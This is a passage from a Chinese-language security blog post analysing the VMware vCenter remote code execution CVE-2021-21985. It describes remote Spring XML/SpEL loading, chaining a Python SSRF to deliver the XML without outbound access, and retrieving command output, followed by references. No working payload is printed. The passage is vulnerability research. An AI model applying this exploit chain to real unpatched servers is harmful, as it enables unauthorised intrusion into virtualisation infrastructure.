<p>对此漏洞作者（rr yyds）利用<code>vmodlContext</code>这个bean对应类<code>com.vmware.vim.vmomi.core.types.impl.VmodContextImpl</code>（vropsplugin-service.jar）的<code>loadVmodlPackage</code>方法，会经由NonValidatingClassPathXmlApplicationContext调用父类ClassPathXmlApplicationContext的构造方法从我们可控的<code>vmodPackage</code>加载，该Spring类构造方法支持远程加载解析xml中的SpEL表达式执行命令。</p>
<p><img src="/img/vcenterldfx_s.png"></p>
<p><code>vmodPackage</code>参数传递过程中通过<code>getContextFileNameForPackage</code>加载<code>/context.xml</code>，并通过其重载方法将<code>.</code>替换为<code>/</code>，xml内容中不能用标准IP和域名，可以用十进制型IP绕过。但这样依然是反向远程加载xml文件，不出网的环境就会很蛋疼，所以现在要解决的问题是如何通过正向访问将恶意xml送进去。可以想到通过<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Data_URI_scheme">data协议</a>传入base64编码的xml数据，可是Java的URL类默认只支持http、https、file、jar。</p>
<p><img src="/img/vcenterldfx_q.png"></p>
<p>Java不行！Python行！位于<code>/usr/lib/vmware-vpx/vsan-health/pyMoVsan/</code>的<code>VsanHttpProvider.py</code>存在一个未授权访问SSRF，匹配<code>vsanHealth/vum/driverOfflineBundle/</code>的请求内容，由urlopen发包并zip解压匹配返回<code>*offline_bundle.*</code>文件内容。<code>/etc/hosts</code>的存在也能帮助绕过<code>.</code>的限制，算是锦上添花了。</p>
<p><img src="/img/vcenterldfx_r.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /etc/hosts</span></span><br><span class="line"><span class="comment"># Begin /etc/hosts (network card version)</span></span><br><span class="line"></span><br><span class="line">127.0.0.1   localhost.localdomain</span><br><span class="line">127.0.0.1	localhost</span><br><span class="line">127.0.0.1	photon-machine</span><br><span class="line"><span class="comment"># End /etc/hosts (network card version)</span></span><br></pre></td></tr></table></figure>

<p>现在就只剩下最后一个问题就是如何拿到命令执行的回显，rr的解决方案是发现可以调用到<code>systemProperties</code>的<code>getProperty</code>方法拿到属性，所以执行命令时只需将结果由<code>system.setProperty</code>存入再读出。也可以利用方法执行时的报错将执行结果带出。</p>
<ul>
<li>System类有一个本质为Hashtable的Properties类型的props静态成员变量，单个JVM实例共享，不同JVM实例隔离</li>
</ul>
<p>总结一下该漏洞可以调用环境中任意类静态方法，比较直接的就是通过JNDI加载远程恶意方法，进一步能够写入和重命名任意文件通过JNI加载so中的native方法，也可以利用Java中的SSRF套娃Python的SSRF实现SpEL注入RCE。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://vdc-download.vmware.com/vmwb-repository/dcr-public/f7ffd9f7-9f92-444c-9529-40913be95870/e6f15e3b-361a-4dac-83e8-d0a4e8b83d0b/vsphere-client-sdk-671-local-programming-guide.pdf">Creating and Deploying Plug-In Packages</a></p>
<p><a target="_blank" rel="noopener" href="https://docs.spring.io/spring-framework/docs/current/reference/html/core.html">Spring Framework Documentation</a></p>
<p><a target="_blank" rel="noopener" href="https://twitter.com/ptswarm/status/1316016337550938122">File Read</a></p>
<p><a target="_blank" rel="noopener" href="https://www.vmware.com/security/advisories/VMSA-2021-0002.html">VMSA-2021-0002</a></p>
<p><a target="_blank" rel="noopener" href="https://swarm.ptsecurity.com/unauth-rce-vmware/">Unauthorized RCE in VMware vCenter</a></p>
<p><a target="_blank" rel="noopener" href="https://0x20h.com/p/7cb6.html">CVE-2021-21972 复现和分析</a></p>
<p><a target="_blank" rel="noopener" href="https://www.vmware.com/security/advisories/VMSA-2021-0010.html">VMSA-2021-0010</a></p>
<p><a target="_blank" rel="noopener" href="https://www.iswin.org/2021/06/02/Vcenter-Server-CVE-2021-21985-RCE-PAYLOAD/">Vcenter Server CVE-2021-21985 RCE PAYLOAD</a></p>
<p><a target="_blank" rel="noopener" href="https://testbnull.medium.com/a-quick-look-at-cve-2021-21985-vcenter-pre-auth-rce-9ecd459150a5">A Quick Look at CVE-2021–21985 VCenter Pre-Auth RCE</a></p>
<p><a target="_blank" rel="noopener" href="http://noahblog.360.cn/vcenter-cve-2021-2021-21985/">VCSA 6.5-7.0 远程代码执行 CVE-2021-21985 漏洞分析</a></p>
<p><a target="_blank" rel="noopener" href="https://cangqingzhe.github.io/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Vcenter漏洞分析</a></p>

      </div>
      
      <footer class="post-footer">
        <div class="post-tags">
            <a href="/tags/JNDI/">JNDI</a>
            <a href="/tags/SSRF/">SSRF</a>
            <a href="/tags/ESXI/">ESXI</a>
            <a href="/tags/VCSA/">VCSA</a>
            <a href="/tags/JNI/">JNI</a>
            <a href="/tags/SpEL/">SpEL</a>
            <a href="/tags/CVE-2021-21972/">CVE-2021-21972</a>
            <a href="/tags/CVE-2021-21985/">CVE-2021-21985</a>
            </div>
        
        <nav class="post-nav"><a class="prev" href="/2021/08/06/%E5%85%B3%E4%BA%8E%E4%BF%AE%E5%A4%8DHotcobalt%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%83%B3%E6%B3%95/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">关于修复Hotcobalt的一些小想法</span>
        <span class="prev-text nav-mobile">上一篇</span>
      </a>
    <a class="next" href="/2021/06/29/%E5%88%A9%E7%94%A8dll%E5%8A%AB%E6%8C%81%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80%E4%B8%8E%E7%BB%B4%E6%9D%83/">
        <span class="next-text nav-default">利用dll劫持实现免杀与维权</span>
        <span class="prev-text nav-mobile">下一篇</span>
        <i class="iconfont icon-right"></i>
      </a>
    </nav></footer>
    </article></div><div class="comments" id="comments"></div></div>
      </main>

      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:hosch3n@protonmail.com" class="iconfont icon-email" title="email"></a>
        <a target="_blank" rel="noopener" href="https://github.com/hosch3n" class="iconfont icon-github" title="github"></a>
        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
    </div><div class="copyright">
  <span class="power-by">
    由 <a class="hexo-link" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> 强力驱动
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    主题 - 
    <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/ahonn/hexo-theme-even">Even</a>
  </span>

  <span class="copyright-year">&copy;2021 - 2022<span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">hosch3n</span>
  </span>
</div>
</footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
</body>
</html>
